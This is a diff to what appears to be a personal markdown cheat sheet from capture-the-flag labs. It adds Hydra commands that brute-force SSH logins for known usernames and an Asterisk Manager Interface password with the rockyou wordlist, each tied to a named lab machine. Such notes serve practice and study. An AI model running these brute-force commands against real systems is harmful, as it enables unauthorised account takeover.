@@ -66,9 +66,9 @@ Used on: **OperationTakeover** - recovered the FRRouting VTY password that grant
 
 ### SSH single-user brute force
 
-`ash
+```bash
 hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh:// -t 4 -V
-`
+```
 
 Used on: **bsidesgtlibrary** - brute-forced an SSH login knowing the username from web enumeration.
 
@@ -76,3 +76,18 @@ Used on: **bsidesgtlibrary** - brute-forced an SSH login knowing the username fr
 - -P — password list
 - -t 4 — 4 parallel threads
 - -V — verbose output
+
+```bash
+hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -V
+```
+Used on: **Gaara** - brute-forced SSH for the known `gaara` user.
+
+### Asterisk AMI brute force
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET -s 5038 asterisk
+```
+Used on: **Aster** - recovered the Asterisk Manager Interface secret for `admin`.
+
+- `asterisk` - Hydra module for Asterisk AMI.
+- `-s 5038` - AMI's common TCP management port.
